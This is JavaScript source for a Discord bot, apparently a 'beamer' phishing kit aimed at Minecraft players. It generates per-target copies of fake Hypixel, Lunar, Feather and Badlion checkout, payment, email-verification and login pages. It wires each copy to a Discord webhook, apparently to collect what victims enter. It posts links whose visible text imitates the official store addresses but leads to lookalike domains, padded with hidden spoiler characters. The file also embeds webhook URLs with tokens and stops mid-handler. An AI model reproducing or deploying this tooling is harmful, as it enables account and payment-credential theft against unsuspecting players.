const fs = require('fs')
const jquery = require('jquery');
const jsdom = require("jsdom");
const { JSDOM } = jsdom;
require('dotenv').config();
const { Client, IntentsBitField, ChannelSelectMenuBuilder, InteractionResponse, ChatInputCommandInteraction, EmbedBuilder, Guild, ChannelType, parseWebhookURL } = require("discord.js");
const { error } = require('console');
const { env } = require('process');
const { channel } = require('diagnostics_channel');
const { ifError } = require('assert');
let fileName = crypto.randomUUID();




const client = new Client({
  intents: [
    IntentsBitField.Flags.Guilds,
    IntentsBitField.Flags.GuildMembers,
    IntentsBitField.Flags.GuildMessages,
    IntentsBitField.Flags.MessageContent,
    IntentsBitField.Flags.DirectMessages,
  ],
});

client.login(process.env.TOKEN);

client.on('ready', (c) => {
  console.log(`${c.user.tag} is online...`)
});

client.on('interactionCreate', (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  if(interaction.commandName === 'start'){
  const { guild, member, options } = interaction

  function createChannel(type){
  let channelName = `${interaction.user.displayName}-${type}`
  guild.channels.create({
    name: channelName,
    type: ChannelType.GuildText,
    permissionOverwrites: [
      {
        id: interaction.user.id,
        allow: [ 'ViewChannel', 'SendMessages', 'ReadMessageHistory']
      },
      {
        id: interaction.guild.roles.everyone.id,
        deny: ['ViewChannel', 'SendMessages', 'ReadMessageHistory']
      }
    ]
  })
  }

  const hypixelStart = new EmbedBuilder()
  .setAuthor({ name: 'HYPIXEL BEAMER' })
  .setTitle('NEW CHANNEL CREATED')
  .setColor('Blue')
  .setDescription(`\n\nUse this channel to run /generate`)
  .setThumbnail('https://cdn.discordapp.com/attachments/1112460075710304439/1150872952603152434/hypixel-512px.png')

  const lunarStart = new EmbedBuilder()
  .setAuthor({ name: 'LUNAR BEAMER' })
  .setTitle('NEW CHANNEL CREATED')
  .setColor('Blue')
  .setDescription(`\n\nUse this channel to run /generate`)
  .setThumbnail('https://cdn.discordapp.com/attachments/1112460075710304439/1139242551380037652/uLTLhANK_400x400.jpg?ex=6543d64e&is=6531614e&hm=754c74f6b7a284caf3a77d0e0abde4f383da7bc6d184c955db77dcec66c7690f&')

  const featherStart = new EmbedBuilder()
  .setAuthor({ name: 'FEATHER BEAMER' })
  .setTitle('NEW CHANNEL CREATED')
  .setColor('Blue')
  .setDescription(`\n\nUse this channel to run /generate`)
  .setThumbnail('https://cdn.discordapp.com/attachments/1112460075710304439/1149395516262727760/channels4_profile.jpg?ex=6543dbfd&is=653166fd&hm=a0f36bb1a817abcabc2f3209964449beced1a3e239287a5442f9b6b5f5919f86&')

  const badlionStart = new EmbedBuilder()
  .setAuthor({ name: 'BADLION BEAMER' })
  .setTitle('NEW CHANNEL CREATED')
  .setColor('Blue')
  .setDescription(`\n\nUse this channel to run /generate`)
  .setThumbnail('https://media.discordapp.net/attachments/1112460075710304439/1139243245088542791/badlion-logo.png?ex=6543d6f3&is=653161f3&hm=c71274dcb8e7a1a719a1c00f0a2c6280bb832ae50aefce30fe96f52ab523f258&=&width=592&height=676')

  if(interaction.options.getString('type') === 'Hypixel'){
    createChannel('Hypixel')
    interaction.reply({
      embeds: [ hypixelStart ],
      ephemeral: true
    })
  }

  if(interaction.options.getString('type') === 'Badlion'){
    createChannel('Badlion')
    interaction.reply({
      embeds: [ badlionStart ],
      ephemeral: true
    })
  }

  if(interaction.options.getString('type') === 'Lunar'){
    createChannel('Lunar')
    interaction.reply({
      embeds: [ lunarStart ],
      ephemeral: true
    })
  }

  if(interaction.options.getString('type') === 'Feather'){
    createChannel('Feather')
    interaction.reply({
      embeds: [ featherStart ],
      ephemeral: true
    })
  }

  

  }
})

client.on('interactionCreate', (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  if(interaction.commandName === 'terminate-session'){

    const { guild, member, options } = interaction

    interaction.channel.delete();

    

  }})



client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  if(interaction.commandName === 'hypixel-create-code'){

     const webhook2 = await interaction.channel.createWebhook({
      name: 'Sondoms Hypixel Beamer',
    })

    const webhookURL = `https://discord.com/api/webhooks/${webhook2.id}/${webhook2.token}`
    
    fs.readFile('hypixel/claim/checkout.html', 'utf8', (err, data) => {
      data = data.replace('MVP ++', `${interaction.options.getString('item')}`)
      data = data.replace('GreenGamer8', `${interaction.options.getString('target-username')}`)
      data = data.replace('7.99', `${interaction.options.getString('price')}`)
      data = data.replace("location.href='tebex.html'", `location.href='tebex${fileName}.html'`)
      data = data.replace('https://discord.com/api/webhooks/1150111118803611799/kFeSzx1-iyvG7bAvfRiO6ajDECd3b5IvlH3wLZFVlp5hQDY3oMKpPdRCPHsR2ZazYWvP', webhookURL)

        fs.writeFile(`hypixel/claim/checkout${fileName}.html`, data, err => {
          console.log('done');
      });

      const genEmbed =  new EmbedBuilder ()
      .setAuthor({ name: 'HYPIXEL BEAMER' })
      .setTitle('NEW LINK GENERATED')
      .setColor('Green')
      .setDescription(`\n\n**Cosmetic:**\n> \`${interaction.options.getString('item')}\`\n\n**Target-User:**\n> \`${interaction.options.getString('target-username')}\`\n\n**Price:**\n> \`${interaction.options.getString('price')}\`\n\n**Link Code:**\n> \`${fileName}\`\n\n**Link:**\n> \`https://claimhypixel.com/hypixel/claim/checkout${fileName}\``)
      .setThumbnail('https://cdn.discordapp.com/attachments/1112460075710304439/1150872952603152434/hypixel-512px.png')

      
        interaction.reply({
          embeds: [genEmbed],
          content: `\`\`\`[htps://store.hypixel.net/claim${fileName}](https://claimhypixel.com/hypixel/claim/checkout${fileName} )||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| https://claimhypixel.com/hypixel/claim/checkout${fileName}\`\`\``
        });

  });

  fs.readFile('hypixel/claim/tebex.html', 'utf-8', (err, data) => {
    if (err) return console.log(err)

    data = data.replace("location.href='email-verif.html'", `location.href='email-verif${fileName}.html'`)
    data = data.replace('12.68', `${interaction.options.getString('price')}`)
    data = data.replace('checkout123.html', `checkout${fileName}.html`)
    data = data.replace('https://discord.com/api/webhooks/1150111118803611799/kFeSzx1-iyvG7bAvfRiO6ajDECd3b5IvlH3wLZFVlp5hQDY3oMKpPdRCPHsR2ZazYWvP', webhookURL)
    data = data.replace('https://discord.com/api/webhooks/1150111153633112164/Fp1o_jQUuv9laUPNatMz1-3QDO1M5DlTBISNwAhFKXfyt90Tup3Uc5MebTWf1S_MfAIx', webhookURL)

    fs.writeFile(`hypixel/claim/tebex${fileName}.html`, data, 'utf-8', (err) => {
      if (err){
        console.log(err)
      }
    })
  })

  fs.readFile('hypixel/claim/email-verif.html', 'utf-8', (err, data) => {
    if (err) return console.log(err)

    data = data.replace("location.href='order-conf.html'", `location.href='order-conf${fileName}.html'`)
    data = data.replace('12.68', `${interaction.options.getString('price')}`)
    data = data.replace('tebex123.html', `tebex${fileName}.html`)
    data = data.replace('https://discord.com/api/webhooks/1150111118803611799/kFeSzx1-iyvG7bAvfRiO6ajDECd3b5IvlH3wLZFVlp5hQDY3oMKpPdRCPHsR2ZazYWvP', webhookURL)
    data = data.replace('https://discord.com/api/webhooks/1150111153633112164/Fp1o_jQUuv9laUPNatMz1-3QDO1M5DlTBISNwAhFKXfyt90Tup3Uc5MebTWf1S_MfAIx', webhookURL)

    fs.writeFile(`hypixel/claim/email-verif${fileName}.html`, data, 'utf-8', (err) => {
      if (err){
        console.log(err)
      }
    })
  })

  fs.readFile('hypixel/claim/order-conf.html', 'utf-8', (err, data) => {
    if (err) return console.log(err)

    data = data.replace('12.68', `${interaction.options.getString('price')}`)
    data = data.replace('email-verif123.html', `email-verif${fileName}.html`)
    data = data.replace('https://discord.com/api/webhooks/1150111118803611799/kFeSzx1-iyvG7bAvfRiO6ajDECd3b5IvlH3wLZFVlp5hQDY3oMKpPdRCPHsR2ZazYWvP', webhookURL)

    fs.writeFile(`hypixel/claim/order-conf${fileName}.html`, data, 'utf-8', (err) => {
      if (err){
        console.log(err)
      }
    })
  })

  setTimeout(() => {
    process.exit();
  }, 2000)

  }
});

client.on('interactionCreate', (interaction) => {
if (!interaction.isChatInputCommand()) return;

if(interaction.commandName === 'hypixel-delete-code'){

  const delEmbed = new EmbedBuilder()
  .setAuthor({ name: 'Hypixel Beamer'})
  .setTitle('LINK HAS BEEN DELETED')
  .setColor('Red')
  .setDescription(`\n\n**Link Code:**\n> \`${interaction.options.getString('code')}\`\n\n**The link has been Succesfully deleted.**`)
  .setThumbnail('https://cdn.discordapp.com/attachments/1112460075710304439/1150872952603152434/hypixel-512px.png')
  
  fs.unlinkSync(`hypixel/claim/checkout${interaction.options.getString('code')}.html`)
  fs.unlinkSync(`hypixel/claim/tebex${interaction.options.getString('code')}.html`)
  fs.unlinkSync(`hypixel/claim/email-verif${interaction.options.getString('code')}.html`)
  fs.unlinkSync(`hypixel/claim/order-conf${interaction.options.getString('code')}.html`)
  interaction.reply({ embeds: [delEmbed] })

  setTimeout(() => {
    process.exit();
  }, 2000)
}
})





client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  if(interaction.commandName === 'lunar-create-code'){

     const webhook2 = await interaction.channel.createWebhook({
      name: 'Sondoms Lunar Beamer',
    })

    const webhookURL = `https://discord.com/api/webhooks/${webhook2.id}/${webhook2.token}`
    
    fs.readFile('lunar/claim/checkout.html', 'utf8', (err, data) => {
      data = data.replace('Cloakwow', `${interaction.options.getString('item')}`)
      data = data.replace('7.99', `${interaction.options.getString('price')}`)
      data = data.replace("login-user.html", `login-user${fileName}.html`)
      data = data.replace('https://discord.com/api/webhooks/1150110883754823740/kKKyuNcasoARXD_Lzr1QTXhPTgGkw4FXFLlba3m83gvsy3VpYj1LW2iip-OpEBotlQqJ', webhookURL)

        fs.writeFile(`lunar/claim/checkout${fileName}.html`, data, err => {
          console.log('done');
      });

      const genEmbed =  new EmbedBuilder ()
      .setAuthor({ name: 'LUNAR BEAMER' })
      .setTitle('NEW LINK GENERATED')
      .setColor('Green')
      .setDescription(`\n\n**Cosmetic:**\n> \`${interaction.options.getString('item')}\`\n\n**Price:**\n> \`${interaction.options.getString('price')}\`\n\n**Link Code:**\n> \`${fileName}\`\n\n**Link:**\n> \`https://www.YOUR_LUNAR_URL_HERE.com/claim/checkout${fileName}\``)
      .setThumbnail('https://cdn.discordapp.com/attachments/1112460075710304439/1139242551380037652/uLTLhANK_400x400.jpg?ex=6543d64e&is=6531614e&hm=754c74f6b7a284caf3a77d0e0abde4f383da7bc6d184c955db77dcec66c7690f&')

      
        interaction.reply({
          embeds: [genEmbed],
          content: `\`\`\`[htps://store.lunarclient.com/claim${fileName}](https://www.YOUR_LUNAR_URL_HERE.com/claim/checkout${fileName} )||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| https://www.YOUR_LUNAR_URL_HERE.com/claim/checkout${fileName}\`\`\``
        });

  });

  fs.readFile('lunar/claim/tebex.html', 'utf-8', (err, data) => {
    if (err) return console.log(err)

    data = data.replace("email-verif.html", `email-verif${fileName}.html`)
    data = data.replace('12.68', `${interaction.options.getString('price')}`)
    data = data.replace('checkout123.html', `checkout${fileName}.html`)
    data = data.replace('https://discord.com/api/webhooks/1150111118803611799/kFeSzx1-iyvG7bAvfRiO6ajDECd3b5IvlH3wLZFVlp5hQDY3oMKpPdRCPHsR2ZazYWvP', webhookURL)
    data = data.replace('https://discord.com/api/webhooks/1150111153633112164/Fp1o_jQUuv9laUPNatMz1-3QDO1M5DlTBISNwAhFKXfyt90Tup3Uc5MebTWf1S_MfAIx', webhookURL)

    fs.writeFile(`lunar/claim/tebex${fileName}.html`, data, 'utf-8', (err) => {
      if (err){
        console.log(err)
      }
    })
  })

  fs.readFile('lunar/claim/email-verif.html', 'utf-8', (err, data) => {
    if (err) return console.log(err)

    data = data.replace("location.href='order-conf.html'", `location.href='order-conf${fileName}.html'`)
    data = data.replace('12.68', `${interaction.options.getString('price')}`)
    data = data.replace('tebex123.html', `tebex${fileName}.html`)
    data = data.replace('https://discord.com/api/webhooks/1150111118803611799/kFeSzx1-iyvG7bAvfRiO6ajDECd3b5IvlH3wLZFVlp5hQDY3oMKpPdRCPHsR2ZazYWvP', webhookURL)
    data = data.replace('https://discord.com/api/webhooks/1150111153633112164/Fp1o_jQUuv9laUPNatMz1-3QDO1M5DlTBISNwAhFKXfyt90Tup3Uc5MebTWf1S_MfAIx', webhookURL)

    fs.writeFile(`lunar/claim/email-verif${fileName}.html`, data, 'utf-8', (err) => {
      if (err){
        console.log(err)
      }
    })
  })

  fs.readFile('lunar/claim/order-conf.html', 'utf-8', (err, data) => {
    if (err) return console.log(err)

    data = data.replace('12.68', `${interaction.options.getString('price')}`)
    data = data.replace('email-verif123.html', `email-verif${fileName}.html`)
    data = data.replace('https://discord.com/api/webhooks/1150111118803611799/kFeSzx1-iyvG7bAvfRiO6ajDECd3b5IvlH3wLZFVlp5hQDY3oMKpPdRCPHsR2ZazYWvP', webhookURL)

    fs.writeFile(`lunar/claim/order-conf${fileName}.html`, data, 'utf-8', (err) => {
      if (err){
        console.log(err)
      }
    })
  })

  fs.readFile(`lunar/claim/login-user.html`, 'utf-8', (err, data) => {
    if (err) return console.log(err)

    data = data.replace('tebex123.html', `tebex${fileName}.html`)
    data = data.replace('https://discord.com/api/webhooks/1150111118803611799/kFeSzx1-iyvG7bAvfRiO6ajDECd3b5IvlH3wLZFVlp5hQDY3oMKpPdRCPHsR2ZazYWvP', webhookURL)

    fs.writeFile(`lunar/claim/login-user${fileName}.html`, data, 'utf-8', (err) => {
      if (err){
        console.log(err)
      }
    })
  })

  setTimeout(() => {
    process.exit();
  }, 2000)

  }
});

client.on('interactionCreate', (interaction) => {
if (!interaction.isChatInputCommand()) return;

if(interaction.commandName === 'lunar-delete-code'){

  const delEmbed = new EmbedBuilder()
  .setAuthor({ name: 'Lunar Beamer'})
  .setTitle('LINK HAS BEEN DELETED')
  .setColor('Red')
  .setDescription(`\n\n**Link Code:**\n> \`${interaction.options.getString('code')}\`\n\n**The link has been Succesfully deleted.**`)
  .setThumbnail('https://cdn.discordapp.com/attachments/1112460075710304439/1139242551380037652/uLTLhANK_400x400.jpg?ex=6543d64e&is=6531614e&hm=754c74f6b7a284caf3a77d0e0abde4f383da7bc6d184c955db77dcec66c7690f&')
  
  fs.unlinkSync(`lunar/claim/checkout${interaction.options.getString('code')}.html`)
  fs.unlinkSync(`lunar/claim/tebex${interaction.options.getString('code')}.html`)
  fs.unlinkSync(`lunar/claim/email-verif${interaction.options.getString('code')}.html`)
  fs.unlinkSync(`lunar/claim/order-conf${interaction.options.getString('code')}.html`)
  fs.unlinkSync(`lunar/claim/login-user${interaction.options.getString('code')}.html`)
  interaction.reply({ embeds: [delEmbed] })

  setTimeout(() => {
    process.exit();
  }, 2000)
}
})






client.on('interactionCreate', (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  if(interaction.commandName === 'terminate-session'){

    const { guild, member, options } = interaction

    interaction.channel.delete();

    

  }})



client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  if(interaction.commandName === 'feather-create-code'){

     const webhook2 = await interaction.channel.createWebhook({
      name: 'Sondoms Feather Beamer',
    })

    const webhookURL = `https://discord.com/api/webhooks/${webhook2.id}/${webhook2.token}`
    
    fs.readFile('feather/claim/checkout.html', 'utf8', (err, data) => {
      data = data.replace('Neon Miami', `${interaction.options.getString('item')}`)
      data = data.replace('1dayorday1', `${interaction.options.getString('target-username')}`)
      data = data.replace('45345.00', `${interaction.options.getString('price')}`)
      data = data.replace("location.href='tebex.html'", `location.href='tebex${fileName}.html'`)
      data = data.replace('https://discord.com/api/webhooks/1150111209786445835/Nxo1ZRuCRH6mA-Imu6O8If1alMrT0BBsCE6YSZmeg-ecKw_In7w8EuO9D7W-BKDgLL3n', webhookURL)

        fs.writeFile(`feather/claim/checkout${fileName}.html`, data, err => {
          console.log('done');
      });

      const genEmbed =  new EmbedBuilder ()
      .setAuthor({ name: 'FEATHER BEAMER' })
      .setTitle('NEW LINK GENERATED')
      .setColor('Green')
      .setDescription(`\n\n**Cosmetic:**\n> \`${interaction.options.getString('item')}\`\n\n**Target-User:**\n> \`${interaction.options.getString('target-username')}\`\n\n**Price:**\n> \`${interaction.options.getString('price')}\`\n\n**Link Code:**\n> \`${fileName}\`\n\n**Link:**\n> \`https://yourdomain.com/claim/checkout${fileName}\``)
      .setThumbnail('https://cdn.discordapp.com/attachments/1112460075710304439/1149395516262727760/channels4_profile.jpg?ex=6543dbfd&is=653166fd&hm=a0f36bb1a817abcabc2f3209964449beced1a3e239287a5442f9b6b5f5919f86&')

      
        interaction.reply({
          embeds: [genEmbed],
          content: `\`\`\`[htps://store.feathermc.com/claim${fileName}](https://yourdomain.com/claim/checkout${fileName} )||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| https://yourdomain.com/claim/checkout${fileName}\`\`\``
        });

  });

  fs.readFile('feather/claim/tebex.html', 'utf-8', (err, data) => {
    if (err) return console.log(err)

    data = data.replace("location.href='email-verif.html'", `location.href='email-verif${fileName}.html'`)
    data = data.replace('12.68', `${interaction.options.getString('price')}`)
    data = data.replace('checkout123.html', `checkout${fileName}.html`)
    data = data.replace('https://discord.com/api/webhooks/1150111118803611799/kFeSzx1-iyvG7bAvfRiO6ajDECd3b5IvlH3wLZFVlp5hQDY3oMKpPdRCPHsR2ZazYWvP', webhookURL)
    data = data.replace('https://discord.com/api/webhooks/1150111153633112164/Fp1o_jQUuv9laUPNatMz1-3QDO1M5DlTBISNwAhFKXfyt90Tup3Uc5MebTWf1S_MfAIx', webhookURL)

    fs.writeFile(`feather/claim/tebex${fileName}.html`, data, 'utf-8', (err) => {
      if (err){
        console.log(err)
      }
    })
  })

  fs.readFile('feather/claim/email-verif.html', 'utf-8', (err, data) => {
    if (err) return console.log(err)

    data = data.replace("location.href='order-conf.html'", `location.href='order-conf${fileName}.html'`)
    data = data.replace('12.68', `${interaction.options.getString('price')}`)
    data = data.replace('tebex123.html', `tebex${fileName}.html`)
    data = data.replace('https://discord.com/api/webhooks/1150111118803611799/kFeSzx1-iyvG7bAvfRiO6ajDECd3b5IvlH3wLZFVlp5hQDY3oMKpPdRCPHsR2ZazYWvP', webhookURL)
    data = data.replace('https://discord.com/api/webhooks/1150111153633112164/Fp1o_jQUuv9laUPNatMz1-3QDO1M5DlTBISNwAhFKXfyt90Tup3Uc5MebTWf1S_MfAIx', webhookURL)

    fs.writeFile(`feather/claim/email-verif${fileName}.html`, data, 'utf-8', (err) => {
      if (err){
        console.log(err)
      }
    })
  })

  fs.readFile('feather/claim/order-conf.html', 'utf-8', (err, data) => {
    if (err) return console.log(err)

    data = data.replace('12.68', `${interaction.options.getString('price')}`)
    data = data.replace('email-verif123.html', `email-verif${fileName}.html`)
    data = data.replace('https://discord.com/api/webhooks/1150111118803611799/kFeSzx1-iyvG7bAvfRiO6ajDECd3b5IvlH3wLZFVlp5hQDY3oMKpPdRCPHsR2ZazYWvP', webhookURL)

    fs.writeFile(`feather/claim/order-conf${fileName}.html`, data, 'utf-8', (err) => {
      if (err){
        console.log(err)
      }
    })
  })

  setTimeout(() => {
    process.exit();
  }, 2000)

  }
});

client.on('interactionCreate', (interaction) => {
if (!interaction.isChatInputCommand()) return;

if(interaction.commandName === 'feather-delete-code'){

  const delEmbed = new EmbedBuilder()
  .setAuthor({ name: 'Feather Beamer'})
  .setTitle('LINK HAS BEEN DELETED')
  .setColor('Red')
  .setDescription(`\n\n**Link Code:**\n> \`${interaction.options.getString('code')}\`\n\n**The link has been Succesfully deleted.**`)
  .setThumbnail('https://cdn.discordapp.com/attachments/1112460075710304439/1149395516262727760/channels4_profile.jpg?ex=6543dbfd&is=653166fd&hm=a0f36bb1a817abcabc2f3209964449beced1a3e239287a5442f9b6b5f5919f86&')
  
  fs.unlinkSync(`feather/claim/checkout${interaction.options.getString('code')}.html`)
  fs.unlinkSync(`feather/claim/tebex${interaction.options.getString('code')}.html`)
  fs.unlinkSync(`feather/claim/email-verif${interaction.options.getString('code')}.html`)
  fs.unlinkSync(`feather/claim/order-conf${interaction.options.getString('code')}.html`)
  interaction.reply({ embeds: [delEmbed] })

  setTimeout(() => {
    process.exit();
  }, 2000)
}
})




client.on('interactionCreate', (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  if(interaction.commandName === 'terminate-session'){

    const { guild, member, options } = interaction

    interaction.channel.delete();

    

  }})



client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  if(interaction.commandName === 'badlion-create-code'){

     const webhook2 = await interaction.channel.createWebhook({
      name: 'Sondoms Badlion Beamer',
    })

    const webhookURL = `https://discord.com/api/webhooks/${webhook2.id}/${webhook2.token}`
    
    fs.readFile('badlion/claim/checkout.html', 'utf8', (err, data) => {
      data = data.replace('Lightning Blue Cloak', `${interaction.options.getString('item')}`)
      data = data.replace('15.00', `${interaction.options.getString('price')}`)
      data = data.replace("location.href='tebex.html'", `location.href='tebex${fileName}.html'`)
      data = data.replace('https://discord.com/api/webhooks/1150111067503071233/CgGXKEGPlXyIEfWnbSBHovaIliTR3XMbkUHks_fWdDbGh9cr25Y1Vzrm4h9P4ToqgmKa', webhookURL)

        fs.writeFile(`badlion/claim/checkout${fileName}.html`, data, err => {
          console.log('done');
      });

      const genEmbed =  new EmbedBuilder ()
      .setAuthor({ name: 'BADLION BEAMER' })
      .setTitle('NEW LINK GENERATED')
      .setColor('Green')
      .setDescription(`\n\n**Cosmetic:**\n> \`${interaction.options.getString('item')}\`\n\n**Price:**\n> \`${interaction.options.getString('price')}\`\n\n**Link Code:**\n> \`${fileName}\`\n\n**Link:**\n> \`https://claimhypixel.com/claim/checkout${fileName}\``)
      .setThumbnail('https://media.discordapp.net/attachments/1112460075710304439/1139243245088542791/badlion-logo.png?ex=6543d6f3&is=653161f3&hm=c71274dcb8e7a1a719a1c00f0a2c6280bb832ae50aefce30fe96f52ab523f258&=&width=592&height=676')

      
        interaction.reply({
          embeds: [genEmbed],
          content: `\`\`\`[htps://store.badlion.net/claim${fileName}](https://www.YOUR_URL_HERE.com/claim/checkout${fileName} )||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| https://www.YOUR_URL_HERE.com/claim/checkout${fileName}\`\`\``
        });

  });

  fs.readFile('badlion/claim/tebex.html', 'utf-8', (err, data) => {
    if (err) return console.log(err)

    data = data.replace("location.href='email-verif.html'", `location.href='email-verif${fileName}.html'`)
    data = data.replace('12.68', `${interaction.options.getString('price')}`)
    data = data.replace('checkout123.html', `checkout${fileName}.html`)
    data = data.replace('https://discord.com/api/webhooks/1150111118803611799/kFeSzx1-iyvG7bAvfRiO6ajDECd3b5IvlH3wLZFVlp5hQDY3oMKpPdRCPHsR2ZazYWvP', webhookURL)
    data = data.replace('https://discord.com/api/webhooks/1150111153633112164/Fp1o_jQUuv9laUPNatMz1-3QDO1M5DlTBISNwAhFKXfyt90Tup3Uc5MebTWf1S_MfAIx', webhookURL)

    fs.writeFile(`badlion/claim/tebex${fileName}.html`, data, 'utf-8', (err) => {
      if (err){
        console.log(err)
      }
    })
  })

  fs.readFile('badlion/claim/email-verif.html', 'utf-8', (err, data) => {
    if (err) return console.log(err)

    data = data.replace("location.href='order-conf.html'", `location.href='order-conf${fileName}.html'`)
    data = data.replace('12.68', `${interaction.options.getString('price')}`)
    data = data.replace('tebex123.html', `tebex${fileName}.html`)
    data = data.replace('https://discord.com/api/webhooks/1150111118803611799/kFeSzx1-iyvG7bAvfRiO6ajDECd3b5IvlH3wLZFVlp5hQDY3oMKpPdRCPHsR2ZazYWvP', webhookURL)
    data = data.replace('https://discord.com/api/webhooks/1150111153633112164/Fp1o_jQUuv9laUPNatMz1-3QDO1M5DlTBISNwAhFKXfyt90Tup3Uc5MebTWf1S_MfAIx', webhookURL)

    fs.writeFile(`badlion/claim/email-verif${fileName}.html`, data, 'utf-8', (err) => {
      if (err){
        console.log(err)
      }
    })
  })

  fs.readFile('badlion/claim/order-conf.html', 'utf-8', (err, data) => {
    if (err) return console.log(err)

    data = data.replace('12.68', `${interaction.options.getString('price')}`)
    data = data.replace('email-verif123.html', `email-verif${fileName}.html`)
    data = data.replace('https://discord.com/api/webhooks/1150111118803611799/kFeSzx1-iyvG7bAvfRiO6ajDECd3b5IvlH3wLZFVlp5hQDY3oMKpPdRCPHsR2ZazYWvP', webhookURL)

    fs.writeFile(`badlion/claim/order-conf${fileName}.html`, data, 'utf-8', (err) => {
      if (err){
        console.log(err)
      }
    })
  })

  setTimeout(() => {
    process.exit();
  }, 2000)

  }
});

client.on('interactionCreate', (interaction) => {
if (!interaction.isChatInputCommand()) return;

if(interaction.commandName === 'badlion-delete-code'){

  const delEmbed = new EmbedBuilder()
  .setAuthor({ name: 'Badlion Beamer'})
  .setTitle('LINK HAS BEEN DELETED')
  .setColor('Red')
  .setDescription(`\n\n**Link Code:**\n> \`${interaction.options.getString('code')}\`\n\n**The link has been Succesfully deleted.**`)
  .setThumbnail('https://media.discordapp.net/attachments/1112460075710304439/1139243245088542791/badlion-logo.png?ex=6543d6f3&is=653161f3&hm=c71274dcb8e7a1a719a1c00f0a2c6280bb832ae50aefce30fe96f52ab523f258&=&width=592&height=676')
  
  fs.unlinkSync(`badlion/claim/checkout${interaction.options.getString('code')}.html`)
